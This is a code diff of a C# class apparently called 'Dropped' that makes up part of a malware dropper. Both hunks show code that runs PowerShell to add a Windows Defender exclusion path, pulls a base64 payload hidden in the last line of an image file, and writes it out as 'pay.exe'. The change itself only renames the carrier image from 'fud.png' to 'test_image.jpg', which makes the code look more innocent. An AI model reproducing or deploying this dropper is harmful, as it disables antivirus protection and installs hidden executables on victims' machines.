@@ -80,7 +80,7 @@ public class Dropped
         pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath path";
         pstest.Start();
         string path2 = Directory.GetCurrentDirectory();
-        string image = "REPLACE" + "\\fud.png";
+        string image = "REPLACE" + "\\test_image.jpg";
         var last_line = File.ReadLines(image).Last().ToString();
         var base64_decode = Convert.FromBase64String(last_line);
         File.WriteAllBytes(path + "pay.exe", base64_decode);
@@ -121,7 +121,7 @@ public class Dropped
         pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath path";
         pstest.Start();
         string path2 = Directory.GetCurrentDirectory();
-        string image = "REPLACE" + "\\fud.png";
+        string image = "REPLACE" + "\\test_image.jpg";
         var last_line = File.ReadLines(image).Last().ToString();
         var base64_decode = Convert.FromBase64String(last_line);
         File.WriteAllBytes(path + "pay.exe", base64_decode);
